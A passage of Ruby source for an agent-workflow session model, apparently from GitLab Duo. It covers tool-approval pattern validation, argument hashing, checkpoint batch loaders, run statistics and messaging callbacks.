          raise ArgumentError, "Pattern must be a non-empty string" unless pattern.is_a?(String) && !pattern.empty?

          return unless pattern.length > MAX_PATTERN_LENGTH

          raise ArgumentError, "Pattern must not exceed #{MAX_PATTERN_LENGTH} characters"
        end

        def validate_command_tool_pattern!(tool_name, pattern)
          return unless COMMAND_TOOL_NAMES.include?(tool_name)

          # Use Shellwords.split consistently with CommandPatternMatcher to
          # prevent shell-quoting bypasses (e.g. '"*"' or '"**"' evading
          # plain String#split checks). Parse failures fall through to the
          # metacharacter check which rejects unbalanced quotes.
          tokens = begin
            Shellwords.split(pattern)
          rescue ArgumentError
            nil
          end

          if tokens
            raise ArgumentError, "Wildcard-only patterns are not allowed for command tools" if tokens == ['*']

            # Block any pattern containing ** as a token. Leading ** (e.g. "** checkout")
            # bypasses the flag-rejection intent of constrained wildcards, and the gateway
            # only generates * patterns today. ** is reserved for future config-file use.
            raise ArgumentError, "Double wildcard (**) patterns are not allowed for command tools" if tokens.any?('**')
          end

          return unless command_contains_shell_metacharacters?(pattern)

          raise ArgumentError,
            "Patterns for command tools must not contain shell metacharacters (;, &, |, <, >, $, `, newlines, etc.)"
        end

        # Clients and Duo Workflow Service serialize the same args differently (key order, escaping,
        # 1.0 vs 1), so hash a canonical form. Args without one are hashed as is.
        def hash_call_args(call_args)
          ::Digest::SHA256.hexdigest(canonical_call_args(call_args) || call_args)
        end

        def exact_hash_match?(tool_approvals, call_args)
          stored_hashes = tool_approvals[CALL_ARGS_KEY] || []

          # Approvals stored before canonicalization hashed the raw string.
          stored_hashes.include?(hash_call_args(call_args)) ||
            stored_hashes.include?(::Digest::SHA256.hexdigest(call_args))
        end

        def canonical_call_args(call_args)
          return if call_args.bytesize > CANONICAL_CALL_ARGS_MAX_BYTES

          # rubocop:disable Gitlab/Json -- Gitlab::Json (Oj) cannot reject duplicate keys
          parsed = ::JSON.parse(call_args, allow_duplicate_key: false, allow_comments: false)
          ::JSON.generate(canonicalize(parsed))
          # rubocop:enable Gitlab/Json
        rescue ::JSON::JSONError
          nil
        end

        def canonicalize(value)
          case value
          when Hash then value.sort_by(&:first).to_h.transform_values { |item| canonicalize(item) }
          when Array then value.map { |item| canonicalize(item) }
          when Float then (value % 1) == 0 ? value.to_i : value
          else value
          end
        end
      end

      def self.latest_for_flow_triggers(flow_triggers)
        pairs = flow_trigger_pairs(flow_triggers)
        return none if pairs.empty?

        latest = where("#{table_name}.trigger_flow_trigger_id = pairs.trigger_id")
          .where("#{table_name}.service_account_id = pairs.service_account_id")
          .select(:id, :trigger_flow_trigger_id, :status, :created_at, :updated_at)
          .reorder(id: :desc)
          .limit(1)
        pairs_table = Arel::Nodes::Grouping.new(Arel::Nodes::ValuesList.new(pairs))
          .as('pairs(trigger_id, service_account_id)')

        # ignore_columns makes the default SELECT name every column, but the lateral subquery has only those above.
        unscoped.select(arel_table[Arel.star]).from(pairs_table)
          .joins("CROSS JOIN LATERAL (#{latest.to_sql}) AS #{table_name}")
      end

      def self.flow_trigger_pairs(flow_triggers)
        flow_triggers.filter_map do |trigger|
          [trigger.id, trigger.service_account_id] if trigger.service_account_id
        end
      end

      def self.active_counts_per_flow_trigger
        in_status_group(:active).reorder(nil).group(:trigger_flow_trigger_id).count
      end

      def self.run_stats
        run_stats_hash(*(reorder(nil).pick(*run_stats_columns) || [0, 0, 0, 0, nil]))
      end

      def self.run_stats_per_flow_trigger
        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- one row for each flow trigger in the batch
        reorder(nil).group(:trigger_flow_trigger_id).pluck(:trigger_flow_trigger_id, *run_stats_columns)
          .to_h { |trigger_id, *stats| [trigger_id, run_stats_hash(*stats)] }
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      def self.daily_runs
        reorder(run_day).group(run_day).count.map { |date, runs| { date: date, runs: runs } }
      end

      def self.daily_runs_per_flow_trigger
        reorder(run_day).group(:trigger_flow_trigger_id, run_day).count
          .group_by { |(trigger_id, _day), _runs| trigger_id }
          .transform_values { |rows| rows.map { |(_trigger_id, date), runs| { date: date, runs: runs } } }
      end

      def self.run_stats_columns
        states = state_machines[:status].states
        status_in = ->(*statuses) { "status IN (#{statuses.map { |status| states[status].value }.join(', ')})" }

        [
          Arel.sql('COUNT(*)'),
          Arel.sql("COUNT(*) FILTER (WHERE #{status_in.call(:finished)})"),
          Arel.sql("COUNT(*) FILTER (WHERE #{status_in.call(:failed)})"),
          Arel.sql("COUNT(*) FILTER (WHERE #{status_in.call(:stopped)})"),
          Arel.sql(
            'PERCENTILE_CONT(0.5) WITHIN GROUP (ORDER BY EXTRACT(EPOCH FROM updated_at - created_at)) ' \
              "FILTER (WHERE #{status_in.call(*TERMINAL_STATUSES)})"
          )
        ]
      end

      def self.run_stats_hash(total, finished, failed, stopped, median)
        { total_runs: total, finished_runs: finished, failed_runs: failed, stopped_runs: stopped,
          median_duration_seconds: median }
      end

      def self.run_day
        Arel.sql("DATE(created_at AT TIME ZONE 'UTC')")
      end

      private_class_method :run_stats_columns, :run_stats_hash, :run_day

      # DWS fetches a custom AI Catalog flow from GitLab by workflow ID, so the CI job
      # does not include the flow definition. The workflow token keeps its digest.
      # @param project [Project, nil] the workflow's project
      def self.fetch_catalog_flow_config?(item_version, project)
        return false unless project.is_a?(::Project) && item_version&.item&.custom_flow?

        Feature.enabled?(:ai_catalog_fetch_flow_config, project)
      end

      # The gitlab--duo fleet on GitLab.com cannot suspend, so suspendable workloads go to a separate one.
      def self.workload_tag_for(project)
        return SUSPENDABLE_WORKLOAD_TAG if Feature.enabled?(:suspendable_workload_tag_for_dap, project)

        WORKLOAD_TAG
      end

      # Scoped lookups for the compliance agent-artifacts download. The Workflow
      # is the source of truth present in Postgres on every instance, so reading
      # it directly works regardless of whether session analytics are backed by
      # Postgres or ClickHouse (the denormalized SessionArtifact table is only
      # populated when ClickHouse analytics are disabled).
      def self.find_in_project(project, id)
        for_project(project).find_by(id: id)
      end

      def self.find_in_namespace(namespace, id)
        in_namespace(namespace).find_by(id: id)
      end

      # Workflows linked to each of the given pipelines, keyed by pipeline id, so a
      # GraphQL batch loader can serve many pipelines from two indexed queries.
      def self.grouped_by_pipeline_id(pipeline_ids)
        ::Ai::DuoWorkflows::WorkflowPipeline
          .for_pipelines(pipeline_ids)
          .order(workflow_id: :desc)
          .preload(:workflow)
          .group_by(&:pipeline_id)
          .transform_values { |links| links.map(&:workflow) }
      end

      # Ids of the given workflows that have at least one checkpoint, so a GraphQL batch
      # loader can serve #stalled? for a page from two partition-pruned queries. Each
      # workflow is read from the one table its write mode fills.
      def self.ids_with_checkpoints(workflows)
        incremental, legacy = workflows.partition(&:incremental_checkpoints_enabled?)

        (header_workflow_ids(incremental) + checkpoint_workflow_ids(legacy)).to_set
      end

      # workflow_created_at is the header partition key, so passing the workflows' own
      # values prunes the read to their daily partitions.
      def self.header_workflow_ids(workflows)
        return [] if workflows.empty?

        ::Ai::DuoWorkflows::CheckpointHeader
          .where(workflow_id: workflows.map(&:id), workflow_created_at: workflows.map(&:created_at))
          .distinct
          .limit(workflows.size)
          .pluck(:workflow_id)
      end
      private_class_method :header_workflow_ids

      # p_duo_workflows_checkpoints is partitioned by the checkpoint's own created_at,
      # which is never earlier than its workflow's, so the oldest workflow bounds the
      # read. CLOCK_SKEW_BUFFER covers a Rails insert clock running fast.
      def self.checkpoint_workflow_ids(workflows)
        return [] if workflows.empty?

        earliest = workflows.map(&:created_at).min - Checkpoint::CLOCK_SKEW_BUFFER

        ::Ai::DuoWorkflows::Checkpoint
          .where(workflow_id: workflows.map(&:id), created_at: earliest..)
          .distinct
          .limit(workflows.size)
          .pluck(:workflow_id)
      end
      private_class_method :checkpoint_workflow_ids

      # Loads the newest header for every workflow on a page in one query and
      # stores it on each instance, replacing one lookup per workflow.
      def self.prime_latest_checkpoint_headers(workflows, checkpoint_ns: nil)
        candidates = workflows.select do |workflow|
          !workflow.latest_checkpoint_header_loaded?(checkpoint_ns: checkpoint_ns) &&
            workflow.incremental_blob_gate.reconstruct?
        end
        return if candidates.empty?

        headers = latest_checkpoint_headers_for(candidates, checkpoint_ns: checkpoint_ns)
        candidates.each do |workflow|
          workflow.prime_latest_checkpoint_header(headers[workflow.id], checkpoint_ns: checkpoint_ns)
        end
      end

      # Newest header per workflow in one partition-pruned query, keyed by workflow id.
      def self.latest_checkpoint_headers_for(workflows, checkpoint_ns: nil)
        ::Ai::DuoWorkflows::CheckpointHeader
          .where(workflow_id: workflows.map(&:id).uniq, workflow_created_at: workflows.map(&:created_at).uniq)
          .for_checkpoint_ns(checkpoint_ns)
          .latest_per_workflow
          .index_by(&:workflow_id)
      end
      private_class_method :latest_checkpoint_headers_for

      # .prime_latest_checkpoint_headers for the oldest header per workflow.
      def self.prime_earliest_checkpoint_headers(workflows, checkpoint_ns: nil)
        candidates = workflows.select do |workflow|
          !workflow.earliest_checkpoint_header_loaded?(checkpoint_ns: checkpoint_ns) &&
            workflow.incremental_blob_gate.reconstruct?
        end
        return if candidates.empty?

        headers = earliest_checkpoint_headers_for(candidates, checkpoint_ns: checkpoint_ns)
        candidates.each do |workflow|
          workflow.prime_earliest_checkpoint_header(headers[workflow.id], checkpoint_ns: checkpoint_ns)
        end
      end

      def self.earliest_checkpoint_headers_for(workflows, checkpoint_ns: nil)
        ::Ai::DuoWorkflows::CheckpointHeader
          .where(workflow_id: workflows.map(&:id).uniq, workflow_created_at: workflows.map(&:created_at).uniq)
          .for_checkpoint_ns(checkpoint_ns)
          .earliest_per_workflow
          .index_by(&:workflow_id)
      end
      private_class_method :earliest_checkpoint_headers_for

      # Batch form of `checkpoints.latest` for the page's legacy-served sessions. Needs the header primers first.
      def self.prime_latest_legacy_checkpoints(workflows, checkpoint_ns: nil)
        candidates = workflows.select do |workflow|
          !workflow.latest_legacy_checkpoint_loaded?(checkpoint_ns: checkpoint_ns) &&
            !workflow.incremental_blob_gate.read?
        end
        return if candidates.empty?

        rows = legacy_checkpoints_per_workflow(candidates, checkpoint_ns: checkpoint_ns, newest: true)
        candidates.each do |workflow|
          workflow.prime_latest_legacy_checkpoint(rows[workflow.id], checkpoint_ns: checkpoint_ns)
        end
      end

      # .prime_latest_legacy_checkpoints for the oldest row per session.
      def self.prime_earliest_legacy_checkpoints(workflows, checkpoint_ns: nil)
        candidates = workflows.select do |workflow|
          !workflow.earliest_legacy_checkpoint_loaded?(checkpoint_ns: checkpoint_ns) &&
            !workflow.incremental_blob_gate.read?
        end
        return if candidates.empty?

        rows = legacy_checkpoints_per_workflow(candidates, checkpoint_ns: checkpoint_ns, newest: false)
        candidates.each do |workflow|
          workflow.prime_earliest_legacy_checkpoint(rows[workflow.id], checkpoint_ns: checkpoint_ns)
        end
      end

      # Newest or oldest row per workflow, keyed by workflow id: a lateral `LIMIT 1` over a
      # VALUES list (see `MergeRequestDiff.latest_diff_for_merge_requests`).
      def self.legacy_checkpoints_per_workflow(workflows, checkpoint_ns:, newest:)
        checkpoint_table = ::Ai::DuoWorkflows::Checkpoint.arel_table
        row = ::Ai::DuoWorkflows::Checkpoint
          .where(checkpoint_table[:workflow_id].eq(Arel.sql('workflow_ids.id')))
          .created_on_or_before(Time.current + ::Ai::DuoWorkflows::Checkpoint::CLOCK_SKEW_BUFFER)
          .for_checkpoint_ns(checkpoint_ns)
          .order(thread_ts: newest ? :desc : :asc)
          .limit(1)
        id_list = workflows.map { |workflow| "(#{Integer(workflow.id)})" }.uniq.join(',')

        ::Ai::DuoWorkflows::Checkpoint
          .from("(VALUES #{id_list}) workflow_ids (id)")
          .joins("INNER JOIN LATERAL (#{row.to_sql}) #{::Ai::DuoWorkflows::Checkpoint.table_name} ON TRUE")
          .index_by(&:workflow_id)
      end
      private_class_method :legacy_checkpoints_per_workflow

      def self.prime_last_workload_pipeline_statuses(workflows)
        candidates = workflows.select { |workflow| workflow.status_group == :awaiting_input }
        return if candidates.empty?

        statuses = last_workload_pipeline_statuses_for(candidates)
        candidates.each { |workflow| workflow.prime_last_workload_pipeline_status(statuses[workflow.id]) }
      end

      def self.last_workload_pipeline_statuses_for(workflows)
        last_workload_ids = ::Ai::DuoWorkflows::WorkflowsWorkload
          .where(workflow_id: workflows.map(&:id))
          .group(:workflow_id)
          .maximum(:workload_id)
        return {} if last_workload_ids.empty?

        workloads = ::Ci::Workloads::Workload.id_in(last_workload_ids.values).preload(:pipeline).index_by(&:id)

        last_workload_ids.transform_values { |id| workloads[id]&.pipeline&.status&.to_sym }
      end
      private_class_method :last_workload_pipeline_statuses_for

      # Loads the ancestry rows and chat-log blob counts for a whole page in two queries.
      def self.prime_message_history_context(workflows)
        header_rows = checkpoint_header_rows_for(workflows)
        chat_log_counts = chat_log_blob_counts_for(workflows)

        workflows.each do |workflow|
          workflow.prime_checkpoint_header_rows(header_rows.fetch(workflow.id, []))
          workflow.prime_chat_log_blob_counts(chat_log_counts.fetch(workflow.id, {}))
        end
      end

      # #checkpoint_header_rows across a page, grouped by workflow id.
      def self.checkpoint_header_rows_for(workflows)
        ::Ai::DuoWorkflows::CheckpointHeader
          .where(workflow_id: workflows.map(&:id).uniq, workflow_created_at: workflows.map(&:created_at).uniq)
          .pluck(:workflow_id, :id, :thread_ts, :parent_ts, :current_thread) # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- bounded by the page's checkpoint count
          .group_by(&:first)
          .transform_values { |rows| rows.map { |row| row.drop(1) } }
      end
      private_class_method :checkpoint_header_rows_for

      # #chat_log_blob_counts across a page, grouped by workflow id.
      def self.chat_log_blob_counts_for(workflows)
        ::Ai::DuoWorkflows::CheckpointBlob
          .where(
            project_id: workflows.map(&:project_id).uniq,
            workflow_id: workflows.map(&:id).uniq,
            workflow_created_at: workflows.map(&:created_at).uniq,
            channel: 'ui_chat_log'
          )
          .group(:workflow_id, :thread_ts)
          .pluck(:workflow_id, :thread_ts, *CHAT_LOG_COUNTS) # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- one row per checkpoint on the page
          .group_by(&:first)
          .transform_values { |rows| rows.to_h { |_workflow_id, thread_ts, *counts| [thread_ts, counts] } }
      end
      private_class_method :chat_log_blob_counts_for

      # #history_blobs_for across a page, grouped by workflow id. The IN-lists over-fetch; each
      # checkpoint's fold selects its own chain. The thread_ts list stays literal: with a workflow_id
      # list the planner scans (workflow_id, channel, id), where for_thread_ts is an unhashed row filter.
      def self.history_blobs_for_workflows(workflows, thread_ts_chain, channel)
        return {} if thread_ts_chain.empty?

        ::Ai::DuoWorkflows::CheckpointBlob
          .where(
            project_id: workflows.map(&:project_id).uniq,
            workflow_id: workflows.map(&:id).uniq,
            workflow_created_at: workflows.map(&:created_at).uniq,
            thread_ts: thread_ts_chain,
            channel: channel
          )
          .without_replaced_snapshots
          .order(:id)
          .group_by(&:workflow_id)
      end

      # Seeds each workflow's #checkpoint_header_rows memo from one query.
      def self.prime_checkpoint_header_rows_for(workflows)
        rows = checkpoint_header_rows_for(workflows)
        workflows.each { |workflow| workflow.prime_checkpoint_header_rows(rows.fetch(workflow.id, [])) }
      end

      # Newest `channel` blob of each workflow, keyed by workflow id. Each workflow gets
      # one backward index scan that stops at the first row.
      def self.newest_channel_blobs_for(workflows, channel)
        blobs = ::Ai::DuoWorkflows::CheckpointBlob
        table = blobs.quoted_table_name
        # The constant created_at list prunes partitions at plan time; the per-row one alone
        # plans every daily partition.
        newest = blobs
          .where(channel: channel, workflow_created_at: workflows.map(&:created_at).uniq)
          .where("#{table}.workflow_id = w.id AND #{table}.workflow_created_at = w.created_at")
          .order(id: :desc)
          .limit(1)
        rows = workflows.map do |workflow|
          blobs.sanitize_sql_array(['(?, ?::timestamptz)', workflow.id, workflow.created_at])
        end

        blobs
          .from("(VALUES #{rows.join(', ')}) w (id, created_at)")
          .joins("INNER JOIN LATERAL (#{newest.to_sql}) #{table} ON TRUE")
          .index_by(&:workflow_id)
      end

      def self.target_status_for_event(status_event)
        TARGET_STATUSES[status_event]
      end

      # Maps each known workflow_definition to its snake_case label value, so the
      # normalization cost is paid once rather than on every increment. Both registries
      # are in-memory fixed-items models; resolved lazily to avoid autoload-order coupling.
      # A foundational flow is addressable by reference or display name; each keeps its own
      # label, so `developer/v1` and `Developer` are distinct series.
      def self.flow_type_labels
        @flow_type_labels ||= (
          BUILT_IN_FLOW_TYPES +
          ::Ai::Catalog::FoundationalFlow.all.flat_map { |f| [f.foundational_flow_reference, f.display_name] } +
          ::Ai::FoundationalChatAgent.workflow_definitions
        ).compact.index_with { |definition| snake_case_flow_type(definition) }
      end

      def self.snake_case_flow_type(definition)
        definition.downcase.gsub(/[^a-z0-9]+/, '_').delete_prefix('_').delete_suffix('_')
      end

      # Lazily memoized to avoid a CurrentSettings DB read at class-load time.
      # Mirrors the pattern used by Ci::Pipeline.auto_devops_pipelines_completed_total.
      def self.sessions_counter
        @sessions_counter ||= Gitlab::Metrics.counter(
          :gitlab_duo_agent_platform_sessions_total,
          'Total number of Duo Agent Platform session lifecycle transitions, by status and flow type'
        )
      end

      def self.ordered_statuses
        statuses_values = state_machines[:status].states

        GROUPED_STATUSES.flat_map do |_group, statuses|
          statuses.map do |status|
            statuses_values.fetch(status).value
          end
        end
      end

      # Single-pass session (rows) and agent (distinct active instances, see
      # AGENT_INSTANCE_KEY) totals for the current and previous windows, split at
      # `boundary` (the start of the current window). One aggregate over the whole
      # scope mirrors the ClickHouse countIf/uniqExactIf pass, so the namespace
      # hierarchy is resolved once instead of per metric.
      # Sessions count every row in scope; `agent_excluded_references` restricts
      # only the agents aggregates (the caller's policy, not the model's).
      # Returns [sessions_current, sessions_previous, agents_current, agents_previous].
      def self.count_current_and_previous(boundary, agent_excluded_references: [])
        quoted = connection.quote(boundary)
        agents = "COUNT(DISTINCT #{AGENT_INSTANCE_KEY})"
        agents_guard = agents_reference_guard(agent_excluded_references)

        pick(
          Arel.sql("COUNT(*) FILTER (WHERE created_at >= #{quoted})"),
          Arel.sql("COUNT(*) FILTER (WHERE created_at < #{quoted})"),
          Arel.sql("#{agents} FILTER (WHERE created_at >= #{quoted} AND #{agents_guard})"),
          Arel.sql("#{agents} FILTER (WHERE created_at < #{quoted} AND #{agents_guard})")
        )
      end

      # Session (rows) and agent (distinct active instances, see
      # AGENT_INSTANCE_KEY) counts per UTC time bucket, as
      # { Time => { sessions:, agents: } }. `agent_excluded_references`
      # restricts only the agents column, as in count_current_and_previous.
      def self.counts_by_created_at_bucket(hourly: false, agent_excluded_references: [])
        unit = hourly ? 'hour' : 'day'
        bucket = Arel.sql("DATE_TRUNC('#{unit}', created_at)")
        agents_guard = agents_reference_guard(agent_excluded_references)

        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- grouped aggregate, bounded to timeframe buckets
        group(bucket)
          .pluck(bucket, Arel.sql('COUNT(*)'),
            Arel.sql("COUNT(DISTINCT #{AGENT_INSTANCE_KEY}) FILTER (WHERE #{agents_guard})"))
          .to_h { |ts, sessions, agents| [ts.to_time.utc, { sessions: sessions, agents: agents }] }
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      # Project ids the user has sessions in, most recent session first. Grouping
      # collapses each project to one row, so the result is bounded by `limit`
      # however many sessions the user has. Foundational chat agents are excluded
      # to match the session lists this feeds, which never show them.
      def self.recent_session_project_ids_for_user(user_id, limit:)
        for_user(user_id)
          .without_foundational_chat_agents
          .where.not(project_id: nil)
          .group(:project_id)
          .reorder(arel_table[:updated_at].maximum.desc)
          .order(project_id: :asc)
          .limit(limit)
          .pluck(:project_id)
      end

      # Top `limit` values of `column` by session (row) count in scope, as an
      # ordered { value => count } hash. Ties break on the column so the
      # pagination-free top-N stays deterministic.
      def self.top_session_counts_by(column, limit:)
        where.not(column => nil)
          .group(column)
          .order(Arel.sql('COUNT(*) DESC'))
          .order(column => :asc)
          .limit(limit)
          .count
      end

      # Buckets each instance by its FIRST session within the receiver scope (pre-`boundary`
      # ones under nil), so a running sum is the cumulative distinct count over that scope:
      # distinct-as-of-X = first session <= X. Callers bound the scope to the lookback period.
      def self.agent_first_seen_counts(boundary, hourly: false, agent_excluded_references: [])
        unit = hourly ? 'hour' : 'day'
        quoted = connection.quote(boundary)
        guard = agents_reference_guard(agent_excluded_references)
        first_seen = where(Arel.sql(guard))
          .group(Arel.sql(AGENT_INSTANCE_KEY))
          .select(Arel.sql('MIN(created_at) AS first_seen'))
        bucket = Arel.sql(
          "CASE WHEN first_seen >= #{quoted} THEN DATE_TRUNC('#{unit}', first_seen) END")

        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- grouped aggregate, bounded to timeframe buckets plus one baseline row
        unscoped.from(first_seen, 'agent_first_seen')
          .group(bucket)
          .pluck(bucket, Arel.sql('COUNT(*)'))
          .to_h.transform_keys { |bucket_start| bucket_start&.to_time&.utc }
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      # { agent_type => [sessions created in [from, to), last session ever] }.
      def self.session_activity_by_agent_type(from, to)
        in_window = "created_at >= #{connection.quote(from)} AND created_at < #{connection.quote(to)}"

        # rubocop:disable Database/AvoidUsingPluckWithoutLimit -- grouped by agent type, a closed short list
        group(:agent_type)
          .pluck(:agent_type, Arel.sql("COUNT(*) FILTER (WHERE #{in_window})"), Arel.sql('MAX(created_at)'))
          .to_h { |agent_type, session_count, last_session_at| [agent_type, [session_count, last_session_at]] }
        # rubocop:enable Database/AvoidUsingPluckWithoutLimit
      end

      # Matches on the version-less reference (the part before '/'), mirroring
      # FoundationalChatAgent.reference_from_workflow_definition: rows written
      # under older versions of an excluded agent stay excluded after a bump.
      def self.agents_reference_guard(excluded_references)
        return 'TRUE' if excluded_references.empty?

        quoted = excluded_references.map { |reference| connection.quote(reference) }

        "split_part(workflow_definition, '/', 1) NOT IN (#{quoted.join(', ')})"
      end
      private_class_method :agents_reference_guard

      def only_known_agent_privileges
        self.agent_privileges ||= AgentPrivileges::DEFAULT_PRIVILEGES

        agent_privileges.each do |privilege|
          unless AgentPrivileges::ALL_PRIVILEGES.key?(privilege)
            errors.add(:agent_privileges, "contains an invalid value #{privilege}")
          end
        end
      end

      def chat?
        ::Ai::FoundationalChatAgent.foundational_workflow_definition?(workflow_definition)
      end

      def invoked_by?(user)
        return false unless user

        self.user == user
      end

      # Awaiting input is not enough on its own: resuming while the previous
      # workload's pipeline is still going would start a second one for the
      # same session. Idle is excluded: a resume answers a question or an approval, and an idle session has none.
      def resumable?
        status_group == :awaiting_input &&
          ::Ci::Pipeline.completed_statuses.include?(last_workload_pipeline_status)
      end

      # A restart runs a fresh session with this one's parameters rather than
      # reusing this record, so a still-running workload here cannot reach it.
      # Catalog flows only run in a project, so a namespace-level session has
      # nowhere to restart in.
      def restartable?
        project_level? && (failed? || stopped?)
      end

      def messaging_callback_adapter
        messaging_callback_context&.dig('adapter')
      end

      def private_messaging_session?
        adapter_key = messaging_callback_adapter
        return false unless adapter_key

        !!::Ai::Messaging::AdapterRegistry[adapter_key]&.private_to_invoker?
      end

      def noteable
        noteable = issue.presence || merge_request.presence
        return unless noteable.respond_to?(:project) && noteable.project.present?

        noteable
      end

      def foundational_flow
        ::Ai::Catalog::FoundationalFlow[workflow_definition]
      end
      strong_memoize_attr :foundational_flow

      def failure_category
        return unless failed?

        FAILURE_MAPPING.dig(drop_reason, :category) || 'unknown'
      end

      def failure_cause
        return unless failed?

        cause = FAILURE_MAPPING.dig(drop_reason, :cause)
        ::Ai::FoundationalFlowMessages.public_send(cause) if cause # rubocop:disable GitlabSecurity/PublicSend -- cause comes from the frozen FAILURE_MAPPING
      end

      # Every run uses the flow Rails recorded at creation, so the session keeps one flow
      # version for its whole life. Sessions without that record resolve as before.
      def foundational_flow_params
        ::Ai::DuoWorkflows::FlowMetadata.pinned_params(flow_metadata_json) || resolve_foundational_flow_params
      end

      # Flows that manage their own session notes (e.g. Code Review) opt out of
      # the generic agent-session-started/completed/failed system notes.
      def suppress_agent_session_note?
        !!foundational_flow&.suppress_agent_session_note
      end

      # Flows that keep only metadata (e.g. bl_security) must not expose the
      # model's intermediate output in the job log, a generated summary, or any
      # read path (see Ai::DuoWorkflows::ContentRetention).
      def metadata_content_retention?
        foundational_flow&.content_retention == 'metadata'
      end

      # The session's own run reads its complete checkpoints back to resume: Rails
      # authenticates it as the workflow's service account acting for the user.
      def session_service_account?(user)
        return false unless service_account_id

        ::Gitlab::Auth::Identity.resolve_composite_identity_actor(user)&.id == service_account_id
      end

      def from_pipeline?
        return false if chat?

        environment.in?(ENVIRONMENTS_FROM_PIPELINE)
      end

      # Covers chat agent runs with no known executor, a missing catalog item, creation paths
      # that skip the authorizer, and rows predating the column. All fall back to `environment`.
      def execution_unclassified?
        execution_mode.nil?
      end

      def archived?
        created_at <= CHECKPOINT_RETENTION_DAYS.days.ago
      end

      def stalled?
        return false if created?

        self.class.ids_with_checkpoints([self]).exclude?(id)
      end

      def last_executor_logs_url
        last_workload&.logs_url
      end

      def all_executor_logs_urls
        workloads.order(created_at: :desc).filter_map(&:logs_url)
      end

      def last_workload
        @last_workload ||= workloads.order(created_at: :desc).first
      end

      # Intentionally avoids `last_workload` to prevent returning a stale memoized
      # workload when this method and `last_workload` are both called on the same object.
      def last_workload_pipeline_status
        return @primed_last_workload_pipeline_status if defined?(@primed_last_workload_pipeline_status)

        workloads.order(id: :desc).first&.pipeline&.status&.to_sym
      end

      def prime_last_workload_pipeline_status(status)
        @primed_last_workload_pipeline_status = status
      end

      def project_level?
        project_id.present?
      end

      # Derived for now; a persisted runtime column is planned with
      # https://gitlab.com/gitlab-org/gitlab/-/work_items/629005.
      def last_runtime
        return :ci if workloads.exists?

        ::Ai::Catalog::CodingEnvironment.default_runtime_for(workflow_definition, user: user)
      end

      def mcp_workhorse_session?
        chat? && source_mcp? && !workflows_workloads.exists? &&
          ::Ai::FoundationalChatAgent.mcp_workhorse_session?(workflow_definition, user)
      end

      def namespace_level?
        namespace_id.present?
      end

      def resource
        issue || merge_request
      end

      def resource_iid
        resource&.iid
      end

      def resource_web_url
        return unless resource

        Gitlab::UrlBuilder.build(resource)
      end

      def resource_parent
        project || namespace
      end

      # Every workflow started by this workflow, directly or through other workflows.
      def descendant_workflows
        workflows = self.class.arel_table
        cte = ::Gitlab::SQL::RecursiveCTE.new(:descendant_workflows, union_args: { remove_duplicates: false })

        cte << self.class.where(parent_workflow_id: id).select(:id)
        cte << self.class
          .select(workflows[:id])
          .from([workflows, cte.table])
          .where(workflows[:parent_workflow_id].eq(cte.table[:id]))

        # The CTE carries only ids, so filter by it rather than reading rows from it.
        self.class.with.recursive(cte.to_arel).where(workflows[:id].in(cte.table.project(cte.table[:id])))
      end

      def to_ability_name
        'duo_workflow'
      end

      # Atomically merge a partial update into the messaging_callback_context
      # jsonb column (Postgres `||`, not a Ruby read-modify-write) so concurrent
      # writers -- e.g. the progress cursor vs an adapter's status_ts -- don't
      # clobber each other's keys. Like update_column, this bypasses the column's
      # json_schema validation.
      def merge_messaging_callback_context!(attrs)
        jsonb_merge_messaging_callback_context(self.class.where(id: id), attrs)

        # Best-effort in-memory sync; the DB row is authoritative.
        self.messaging_callback_context = (messaging_callback_context || {}).merge(attrs.stringify_keys)
      end

      # Atomically claims the one-shot terminal delivery (delivered_at set only when
      # absent), so exactly one racing CallbackWorker job wins. The blank guard avoids
      # minting a context the schema rejects; there is no surface to deliver to anyway.
      def claim_messaging_callback_delivery
        return false if messaging_callback_context.blank?

        timestamp = Time.current.utc.iso8601
        scope = self.class.where(id: id).where("messaging_callback_context->>'delivered_at' IS NULL")
        claimed = jsonb_merge_messaging_callback_context(scope, 'delivered_at' => timestamp) == 1

        self.messaging_callback_context = messaging_callback_context.merge('delivered_at' => timestamp) if claimed

        claimed
      end

      # Asks the primary, since this copy may have been loaded from a lagging replica.
      def messaging_callback_context_on_primary
        ::Gitlab::Database::LoadBalancing::SessionMap.current(self.class.load_balancer).use_primary do
          self.class.where(id: id).pick(:messaging_callback_context) || {}
        end
      end

      # Status and callback context in one primary read, for surfaces whose render
      # depends on both (a pause, its decision, a delivered answer).
      def messaging_state_on_primary
        status, context = ::Gitlab::Database::LoadBalancing::SessionMap.current(self.class.load_balancer).use_primary do
          self.class.where(id: id).pick(:status, :messaging_callback_context)
        end

        {
          status: self.class.state_machines[:status].states.detect { |state| state.value == status }&.name,
          context: context || {}
        }
      end

      # Reopens the claim (delivered_at: nil in jsonb matches the SQL IS NULL guard)
      # so a Sidekiq retry or a late backstop event can win it again.
      def release_messaging_callback_delivery!
        merge_messaging_callback_context!('delivered_at' => nil)
      end

      # Clear last turn's per-turn callback keys via the adapter so this turn
      # isn't skipped as already-delivered. No-op if there's no messaging surface.
      def reset_messaging_turn!
        context = messaging_callback_context
        return if context.blank?

        adapter_class = ::Ai::Messaging::AdapterRegistry[context['adapter']]
        return unless adapter_class

        merge_messaging_callback_context!(adapter_class.from_callback_context(context).per_turn_reset)
      end

      # Re-broadcasts the triggering notes so open session bars show the new status.
      # ThrottledTouch drops most touches here (sessions often finish inside TOUCH_INTERVAL)
      # and update_columns skips after_commit, so subscription and broadcast fire directly.
      def broadcast_triggering_notes_changed
        note_links.link_type_triggered.preload(note: :noteable).find_each do |link|
          note = link.note
          next unless note.noteable # no noteable, no client to broadcast to

          note.bump_updated_at
          note.trigger_note_subscription_update
          note.broadcast_noteable_notes_changed
        end
      end

      # Latest cumulative ui_chat_log. Memoized: the worker and adapter both read it.
      def latest_ui_chat_log
        ui_chat_log_for(latest_readable_checkpoint)
      end
      strong_memoize_attr :latest_ui_chat_log

      # Full ui_chat_log history behind the latest checkpoint, spanning compactions.
      # Costlier than #latest_ui_chat_log; for readers that need a message a
      # compaction may have trimmed out of the state fold.
      def latest_ui_chat_log_history
        ui_chat_log_for(latest_readable_checkpoint, span_compactions: true)
      end

